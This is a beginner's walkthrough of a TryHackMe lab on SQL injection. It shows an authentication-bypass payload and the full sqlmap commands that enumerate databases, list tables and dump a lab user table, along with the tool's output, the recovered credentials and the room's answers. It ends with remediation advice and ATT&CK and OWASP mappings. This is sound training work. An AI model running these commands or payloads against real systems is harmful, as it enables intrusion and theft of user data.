---
title: "TryHackMe - Practical Task - SQLMap The Basics"
date: 2026-06-28 00:01:00 +0700
categories: [TryHackMe, Web Exploitation]
tags:
  - tryhackme
  - sql-injection
  - sqlmap
  - database
  - linux
  - beginner
author: NoxShepherd
toc: true
comments: true
---

# Overview

When I first heard the term **SQL Injection**, I honestly had no idea what it meant. Databases? Queries? Injection? It sounded like dark magic.

But after working through this room on TryHackMe, everything clicked into place. And I want to make sure that anyone reading this — no matter your background, even if this is your first time opening a terminal — can follow along and understand every step of the process.

In this walkthrough, I'll tell the story of how I exploited a web application vulnerable to SQL Injection using a tool called **SQLMap**, and successfully extracted data from its database — step by step, with full explanations of *why* each action was taken, not just *what* was done.

> ⚠️ **Disclaimer**
> All activities described in this write-up were performed inside an isolated, legal TryHackMe training environment. Never attempt these techniques against systems you do not own or have explicit written permission to test.

---

# Before We Begin — What Even Is a Database?

Imagine you have a notes app on your phone. Every time you write a new note, that data gets stored somewhere. That "somewhere" is called a **database** — a structured system for storing, retrieving, and modifying data.

Every website you use daily relies on a database. For example:

- When you log into a social media platform, the website checks your username and password against a database
- When you search for a product on an e-commerce site, the website fetches product data from a database
- When you make a purchase, your transaction gets recorded into a database

Websites and databases communicate with each other using a special language called **SQL** — *Structured Query Language*. Every time you interact with a website, there's an SQL query being sent to the database behind the scenes.

The simplest example: when you log in, the website sends something like this to the database:

```sql
SELECT * FROM users WHERE username = 'john' AND password = 'secret123';
```

This means: *"Find a user named 'john' with the password 'secret123'. If they exist, return their data."*

If the database finds a match, you're logged in. If not, login fails. Simple enough.

---

# What Is SQL Injection?

Now imagine a website that does **not** validate or sanitize user input before plugging it directly into an SQL query. This is called **unsanitized input** — and it's a critical mistake.

For example, instead of typing a real password, an attacker submits:

```
abc' OR 1=1;-- -
```

This transforms the query the website sends to the database into:

```sql
SELECT * FROM users WHERE username = 'john' AND password = 'abc' OR 1=1;-- -';
```

Let's break this down piece by piece:

| Part | Explanation |
|------|-------------|
| `username = 'john'` | Checks for the username — valid |
| `AND password = 'abc'` | Checks for password 'abc' — **wrong**, should fail |
| `OR 1=1` | BUT there's an OR condition: is 1 equal to 1? **Always true** |
| `;-- -` | Semicolon ends the query; `-- -` comments out everything after |

Because `OR 1=1` is always true, the entire query is evaluated as **successful** — even though the password was wrong. The database returns the user data, and the attacker logs in without ever knowing the real password.

**This is SQL Injection.** The attacker "injects" their own SQL code into an existing query by exploiting the lack of input validation.

---

# Why Does This Matter?

SQL Injection isn't just about bypassing a login page. A successful exploit can allow an attacker to:

- Read **all data** stored in the database — credentials, personal information, payment data
- **Modify** data — change passwords, delete records, alter transactions
- In some cases, even **execute system commands** on the server

This is why SQL Injection has sat at the top of the **OWASP Top 10** — the list of the ten most critical web security risks — for years.

---

# Introducing SQLMap

Performing SQL Injection manually requires deep knowledge of SQL syntax, patience, and a lot of trial and error. You'd need to craft payloads by hand, read server responses, and interpret subtle differences in behavior.

This is where **SQLMap** comes in. SQLMap is an open-source automated tool that can:

1. **Detect** whether a URL is vulnerable to SQL Injection
2. **Identify** the type of database being used (MySQL, PostgreSQL, MSSQL, etc.)
3. **Extract** database names, table names, and the actual data inside them

SQLMap comes pre-installed on Kali Linux. You give it a target URL, and it handles the rest — testing hundreds of payloads automatically.

---

# Lab Information

Here's the environment I was working in for this engagement:

| Item | Detail |
|------|--------|
| Platform | TryHackMe |
| Target OS | Windows (Apache 2.4.53 / MariaDB) |
| Tool | SQLMap 1.10.6 |
| Target IP | `10.48.131.142` |
| Attacker IP | `10.48.68.144` |

The primary target is a web application with a login page hosted at:

```
http://10.48.131.142/ai/login
```

---

# Phase 1 — Reconnaissance: Finding the Entry Point

## Visiting the Target

The first thing I always do before running any tool is **look at the target with my own eyes**. I opened a browser and navigated to:

```
http://10.48.131.142/ai/login
```

A simple login page appeared — email field, password field, a login button. Nothing obviously suspicious on the surface. But the real action happens underneath.

## Understanding GET Parameters

SQLMap needs a **complete URL including its parameters** to work. Parameters are variables sent to the server — usually visible in the URL after a `?` symbol. For example:

```
http://website.com/search?keyword=laptop&category=electronics
```

Here, `keyword` and `category` are GET parameters. They tell the server what data to fetch.

The problem with this login page was that no parameters were visible in the URL. I needed to dig a little deeper.

## Using Browser DevTools to Capture the Request

I right-clicked on the login page and selected **Inspect** (or pressed `F12` to open DevTools), then navigated to the **Network** tab.

Next, I filled in the email and password fields with placeholder values (`test` and `test`) and clicked the Login button.

In the Network tab, a new request appeared. I clicked on it, and there was the full URL:

```
http://10.48.131.142/ai/includes/user_login?email=test&password=test
```

There it was. The application was using a **GET request** with two parameters:
- `email` — the value entered in the email field
- `password` — the value entered in the password field

Both of these values are being sent directly to the server via the URL. This is a strong candidate for SQL Injection — if the server plugs these values into an SQL query without validation, we can manipulate them.

> 💡 **Why are GET parameters interesting to attackers?**
> Because the values in GET parameters often get inserted directly into SQL queries. If there's no sanitization, the door is wide open.

---

# Phase 2 — Database Enumeration

## Building the SQLMap Command

With the target URL confirmed, it was time to fire up SQLMap. I opened a terminal and ran:

```bash
sqlmap -u 'http://10.48.131.142/ai/includes/user_login?email=test&password=test' \
  --dbs \
  --level=5
```

Let's break down every part of this command:

| Part | What It Does |
|------|-------------|
| `sqlmap` | Calls the SQLMap tool |
| `-u '...'` | Defines the target URL. Wrapped in single quotes `'` to prevent the shell from misinterpreting the `&` character |
| `--dbs` | Tells SQLMap to enumerate and list all available databases |
| `--level=5` | Sets the testing depth. Ranges from 1 (fast, basic) to 5 (thorough, tests more payloads). Level 5 gives the best chance of finding injection points |

> ⚠️ **Critical: Always quote URLs containing `&`**
> In Linux, `&` means "run this process in the background." Without quotes, the shell splits your command at every `&`, breaking the SQLMap execution. Always wrap the full URL in single or double quotes.

## Reading the SQLMap Output

Once the command ran, SQLMap started working. The output was long, but let me walk through the important parts.

**First**, SQLMap tested the connection:

```
[INFO] testing connection to the target URL
[INFO] target URL content is stable
```

Good — the server is responding consistently. SQLMap can now test reliably.

**Second**, SQLMap began probing the `email` parameter:

```
[INFO] testing if GET parameter 'email' is dynamic
[INFO] GET parameter 'email' appears to be dynamic
[WARNING] heuristic (basic) test shows that GET parameter 'email' might not be injectable
```

There's a warning saying the parameter *might not* be injectable. This is just SQLMap being cautious after an initial basic check. It continues with deeper testing regardless — and good thing it did.

**Third**, SQLMap asked me some questions during the process:

```
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test
payloads specific for other DBMSes? [Y/n]: y
```
SQLMap detected MySQL as the likely backend. By answering `y`, I told it to focus exclusively on MySQL payloads — faster and more targeted.

```
for the remaining tests, do you want to include all tests for 'MySQL'
extending provided risk (1) value? [Y/n]: y
```
This asks whether to include all MySQL-specific injection techniques. I said yes to maximize coverage.

```
injection not exploitable with NULL values. Do you want to try with a
random integer value for option '--union-char'? [Y/n]: y
```
SQLMap found that UNION-based injection didn't work with NULL placeholders. I allowed it to try with a random integer instead — a common workaround.

```
GET parameter 'email' is vulnerable. Do you want to keep testing the
others (if any)? [y/N]: n
```
SQLMap confirmed the `email` parameter is vulnerable. Since I already had what I needed, I stopped testing additional parameters.

## Injection Types Identified

SQLMap reported three types of SQL Injection on the `email` parameter:

```
Parameter: email (GET)
    Type: boolean-based blind
    Type: error-based
    Type: time-based blind
```

Here's what each of these means:

| Type | How It Works | When It's Used |
|------|-------------|----------------|
| **Boolean-based blind** | Injects a true/false condition and reads subtle changes in the server's response | When server doesn't show errors but responds differently to true vs false conditions |
| **Error-based** | Deliberately triggers database errors that leak information inside the error message | When the server displays database error messages |
| **Time-based blind** | Uses `SLEEP()` to make the server pause, then measures response time to infer data | When server shows nothing — slowest but most reliable fallback |

## Databases Discovered

```
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```

Six databases were exposed. Most are default MySQL system databases (`information_schema`, `mysql`, `performance_schema`). The one that caught my eye immediately was **`ai`** — its name matched the application's URL path (`/ai/login`), making it the obvious target.

> ✅ **Room answer:** There are **6** databases available.

---

# Phase 3 — Table Enumeration

## Targeting the `ai` Database

With `ai` identified as the application's database, I ran SQLMap again — this time targeting that specific database to list its tables.

```bash
sqlmap -u "http://10.48.131.142/ai/includes/user_login?email=test&password=test" \
  -D ai \
  --tables \
  --level=5 \
  --batch
```

What changed from the previous command:

| New Flag | Purpose |
|----------|---------|
| `-D ai` | Selects the `ai` database as the target |
| `--tables` | Instructs SQLMap to enumerate all tables inside that database |
| `--batch` | **Auto-answers all prompts** with default values — no more manual y/n input |

> 💡 **Why use `--batch`?**
> In my earlier attempts, I was accidentally answering SQLMap's prompts in the wrong place (typing into the shell instead of SQLMap's interactive prompt). The `--batch` flag eliminates this problem entirely by handling all prompts automatically with sensible defaults.

## Result: Table Found

```
Database: ai
[1 table]
+------+
| user |
+------+
```

The `ai` database contains exactly **one table** called `user`. A table named `user` almost always stores user account data — emails, passwords, and account metadata. This was exactly what I was looking for.

> ✅ **Room answer:** The table name is **user**.

---

# Phase 4 — Data Extraction (Dumping the Table)

## Extracting Everything From the `user` Table

This was the final step — telling SQLMap to pull every record stored in the `user` table.

```bash
sqlmap -u "http://10.48.131.142/ai/includes/user_login?email=test&password=test" \
  -D ai \
  -T user \
  --dump \
  --batch
```

New flags added:

| Flag | Purpose |
|------|---------|
| `-T user` | Selects the `user` table |
| `--dump` | Extracts all rows of data from the selected table |

## SQLMap Reads the Table Structure First

Before pulling the data, SQLMap first mapped out the table's columns:

```
[INFO] fetching columns for table 'user' in database 'ai'
[INFO] retrieved: 'id'        → int(11)
[INFO] retrieved: 'email'     → varchar(512)
[INFO] retrieved: 'password'  → varchar(512)
[INFO] retrieved: 'created'   → timestamp
```

Four columns: `id`, `email`, `password`, and `created`. The structure of a typical user accounts table — exactly what I expected.

## Credentials Dumped

```
Database: ai
Table: user
[1 entry]
+----+-----------------+---------------------+----------+
| id | email           | created             | password |
+----+-----------------+---------------------+----------+
| 1  | test@chatai.com | 2023-02-21 09:05:46 | 12345678 |
+----+-----------------+---------------------+----------+
```

Full breakdown of what was extracted:

| Column | Value | Significance |
|--------|-------|-------------|
| `id` | `1` | First (and only) user in the database |
| `email` | `test@chatai.com` | Account email address |
| `password` | `12345678` | Password stored in **plaintext** — no hashing |
| `created` | `2023-02-21 09:05:46` | Account creation timestamp |

I successfully extracted valid credentials from the database. But beyond answering the room's question, something stood out immediately: the password was stored as **plaintext**. No hashing, no salting — just raw text. This is a critical finding in its own right, separate from the SQL Injection vulnerability.

> ✅ **Room answer:** The password for `test@chatai.com` is **12345678**.

---

# What Actually Happened Under the Hood

To make this fully concrete, here's a simplified diagram of what occurred during the entire attack chain:

```
[Attacker] → Submits crafted URL to SQLMap
                      ↓
[SQLMap]   → Sends hundreds of HTTP requests with injection payloads
                      ↓
[Web Server] → Receives requests, inserts email parameter directly into SQL query
                      ↓
[Database] → Executes manipulated query, returns unintended data
                      ↓
[SQLMap]   → Collects and reconstructs the data → displays to attacker
```

From the server's perspective, each request looked like a normal browser request. What made them dangerous was the content of the `email` parameter — crafted by SQLMap to contain SQL injection payloads that manipulated the query being executed on the backend.

---

# Mistakes I Made Along the Way

This wasn't a flawless run from start to finish. I made a couple of mistakes early on — and I think being transparent about them is valuable, because you'll likely hit the same walls.

## Mistake 1 — Forgetting to Quote the URL

```bash
# ❌ What I typed first — WRONG
sqlmap -u http://10.48.131.142/ai/includes/user_login?email=test&password=test -D ai --tables
```

Result: `-D: command not found`

Why? Because the shell interpreted `&` as a background operator. It split the command into:
1. `sqlmap -u http://...?email=test` ← runs SQLMap
2. `password=test -D ai --tables` ← tries to run this as a separate command (invalid)

**Fix:** Always wrap URLs in quotes.

```bash
# ✅ Correct
sqlmap -u "http://10.48.131.142/ai/includes/user_login?email=test&password=test"
```

## Mistake 2 — Answering Prompts in the Wrong Place

When SQLMap asked `[Y/n]`, I typed `y` — but got back:

```
y: command not found
```

This happened because SQLMap was running in the background (I had accidentally pressed `Ctrl+Z` earlier), so my `y` input went to the shell, not to SQLMap.

**Fix:** Use `--batch` to auto-answer all SQLMap prompts and avoid this entirely.

```bash
sqlmap -u "..." --batch
```

---

# SQLMap Flag Reference

| Flag | Purpose |
|------|---------|
| `-u "URL"` | Target URL |
| `--dbs` | Enumerate all databases |
| `-D dbname` | Select a specific database |
| `--tables` | List tables in the selected database |
| `-T tablename` | Select a specific table |
| `--dump` | Extract all records from the selected table |
| `--level=5` | Maximum testing depth (1–5) |
| `--batch` | Auto-answer all prompts with default values |
| `--cookie="..."` | Include a session cookie for authenticated testing |
| `-r file.txt` | Load an intercepted POST request from a file |

---

# Findings & Recommendations

## Finding 1 — SQL Injection on `email` Parameter (Critical)

The application inserts the `email` GET parameter directly into an SQL query without any validation or sanitization. This allows an attacker to manipulate the query and extract the entire database contents.

**Remediation:** Use prepared statements with parameterized queries:

```php
// ❌ Vulnerable
$query = "SELECT * FROM users WHERE email = '$email'";

// ✅ Secure
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$email]);
```

## Finding 2 — Plaintext Password Storage (Critical)

The password `12345678` was stored in the database with no hashing or salting. Any attacker who gains database access can immediately read all user passwords.

**Remediation:** Always hash passwords before storing them using a strong, modern algorithm:

```php
// Storing a password
$hash = password_hash($password, PASSWORD_BCRYPT);

// Verifying a password at login
$valid = password_verify($inputPassword, $storedHash);
```

---

# MITRE ATT&CK Mapping

| Technique ID | Name | Relevance |
|-------------|------|-----------|
| T1190 | Exploit Public-Facing Application | Initial access via vulnerable login endpoint |
| T1059 | Command and Scripting Interpreter | SQLMap executed via Linux terminal |
| T1078 | Valid Accounts | Credentials obtained from database dump |

---

# OWASP Top 10 Mapping

| Category | Explanation |
|----------|-------------|
| `A03:2021 – Injection` | Unsanitized input leads to arbitrary SQL execution |
| `A02:2021 – Cryptographic Failures` | Password stored as plaintext without hashing |
| `A05:2021 – Security Misconfiguration` | Verbose database errors exposed DBMS details |

---

# Room Questions & Answers

| Question | Answer |
|----------|--------|
| Which language builds the interaction between a website and its database? | `SQL` |
| Which boolean operator checks if at least one side is true? | `OR` |
| Is `1=1` in an SQL query always true? | `Yea` |
| Which flag in SQLMap is used to extract all available databases? | `--dbs` |
| Full SQLMap command to extract tables from the `members` database? | `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables` |
| How many databases are available in this web application? | `6` |
| What is the name of the table in the `ai` database? | `user` |
| What is the password of `test@chatai.com`? | `12345678` |

---

# Lessons Learned

This room taught me something important: **the most dangerous vulnerabilities are often the simplest ones.**

SQL Injection has existed since the late 1990s. Yet it continues to appear consistently in penetration tests and real-world breaches. The reason isn't technical complexity — it's developer habits. Input fields get built quickly, validation gets skipped, and the assumption is made that users will always submit expected data. That assumption is what attackers exploit.

From a **red team perspective**, understanding SQL Injection isn't just about knowing how to run SQLMap. It's about understanding *why* the tool works — what's happening at the query level, what each injection type is actually doing, and how to interpret the output intelligently. That's the difference between someone running a script and someone who actually understands the attack.

From a **blue team perspective**, parameterized queries and proper password hashing aren't optional security controls. They're fundamental baselines. One missing line of input validation can mean the entire database is exposed to anyone who knows how to use a freely available tool.

---

*Written by NoxShepherd — TryHackMe Walkthrough Series*
*"The quieter you become, the more you are able to hear." — Kali Linux*
